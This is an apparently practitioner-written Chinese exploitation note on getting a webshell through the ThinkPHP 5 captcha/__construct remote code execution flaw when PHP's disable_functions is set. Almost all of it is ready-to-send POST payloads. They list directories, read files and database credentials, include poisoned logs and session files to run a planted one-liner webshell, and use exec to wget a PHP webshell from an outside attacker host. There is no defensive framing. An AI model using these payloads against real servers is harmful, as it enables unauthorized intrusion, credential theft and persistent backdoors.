# Thinkphp bypass disable funtion

---

情况：tp5 rce可以执行phpinfo，但是其他可以getshell的函数不能使用

下面请求均为:

```
/?s=captcha
postdata:
```

- 方法1：文件读取数据库连接信息+phpmyadmin或者数据库外连，后续数据库getshell

  
  ```
  # 扫描路径下的文件并列出（通过phpinfo可以知道网站根目录的绝对路径）
  _method=__construct&filter[]=scandir&filter[]=var_dump&method=GET&get[]=路径
  # 读取文件内容
  _method=__construct&filter[]=highlight_file&method=GET&get[]=读取的文件路径
  ```
  
- 方法2：日志包含

  前提：日志泄露是否存在
  
  ```
  # 随便输入
  _method=__construct&method=get&filter[]=call_user_func&server[]=phpinfo&get[]=一句话

  # 包含日志执行phpinfo
  _method=__construct&method=get&filter[]=think\__include_file&server[]=phpinfo&get[]=../data/runtime/log/202110/17.log&c=phpinfo();
  ```
  
- 方法3：Session包含
  
  ```
  # 前提条件：session_start()
  # 设置session存入session缓存中
_method=__construct&filter[]=think\Session::set&method=get&get[]= 一句话&server[]=1
  
  # tp5的session文件均在/tmp/sess_sessionid  (sessionid=cookie里面的PHPSESSID)
  # phpinfo中session.save_path为session保存的路径，文件为：sess_sessionid
  _method=__construct&method=get&filter[]=think\__include_file&server[]=phpinfo&get[]=/tmp/sess_ejc3iali7uv3deo9g6ha8pbtoi&c=phpinfo();
  ```
  
- 方法4：命令执行

  前提:目标是linux系统,如果是windows需要换命令
  
  ```
  # 公网搭建一句话的php
  s=wget http://xxxxxx/test.php&_method=__construct&method=get&filter[]=exec
  # 访问目标的/test.php
  ```
